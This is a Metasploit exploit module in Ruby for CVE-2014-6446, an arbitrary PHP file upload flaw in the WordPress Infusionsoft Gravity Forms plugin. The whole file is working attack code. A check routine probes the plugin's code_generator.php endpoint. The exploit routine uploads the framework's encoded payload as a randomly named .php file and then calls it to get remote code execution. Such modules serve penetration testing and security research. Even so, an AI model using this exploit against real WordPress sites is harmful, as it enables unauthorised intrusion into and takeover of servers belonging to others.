##
# This module requires Metasploit: http//metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'

class Metasploit3 < Msf::Exploit::Remote
  Rank = ExcellentRanking

  include Msf::HTTP::Wordpress
  include Msf::Exploit::FileDropper

  def initialize(info = {})
    super(update_info(info,
      'Name'           => 'Wordpress InfusionSoft Upload Vulnerability',
      'Description'    => %q{
        This module exploits an arbitrary PHP code upload in the wordpress Infusionsoft Gravity
        Forms plugin, versions from 1.5.3 to 1.5.10. The vulnerability allows for arbitrary file
        upload and remote code execution.
      },
      'Author'         =>
        [
          'g0blin',                    # Vulnerability Discovery
          'us3r777 <us3r777@n0b0.so>'  # Metasploit module
        ],
      'License'        => MSF_LICENSE,
      'References'     =>
        [
          ['CVE', '2014-6446'],
          ['URL', 'http://research.g0blin.co.uk/cve-2014-6446/'],
        ],
      'Privileged'     => false,
      'Platform'       => 'php',
      'Arch'           => ARCH_PHP,
      'Targets'        => [['Infusionsoft 1.5.3 - 1.5.10', {}]],
      'DisclosureDate' => 'Sep 25 2014',
      'DefaultTarget'  => 0)
    )
  end

  def check
    res = send_request_cgi(
      'uri'    => normalize_uri(wordpress_url_plugins, 'infusionsoft', 'Infusionsoft', 'utilities', 'code_generator.php')
    )

    if res && res.code == 200 && res.body =~ /Code Generator/ && res.body =~ /Infusionsoft/
      return Exploit::CheckCode::Detected
    end

    Exploit::CheckCode::Safe
  end

  def exploit
    php_pagename = rand_text_alpha(8 + rand(8)) + '.php'
    res = send_request_cgi({
      'uri'       => normalize_uri(wordpress_url_plugins, 'infusionsoft',
                     'Infusionsoft', 'utilities', 'code_generator.php'),
      'method'    => 'POST',
      'vars_post' =>
      {
        'fileNamePattern' => php_pagename,
        'fileTemplate'    => payload.encoded
      }
    })

    if res && res.code == 200 && res.body && res.body.to_s =~ /Creating File/
      print_good("#{peer} - Our payload is at: #{php_pagename}. Calling payload...")
      register_files_for_cleanup(php_pagename)
    else
      fail_with("#{peer} - Unable to deploy payload, server returned #{res.code}")
    end

    print_status("#{peer} - Calling payload ...")
    send_request_cgi({
      'uri'       => normalize_uri(wordpress_url_plugins, 'infusionsoft',
                     'Infusionsoft', 'utilities', php_pagename)
    }, 2)
  end

end
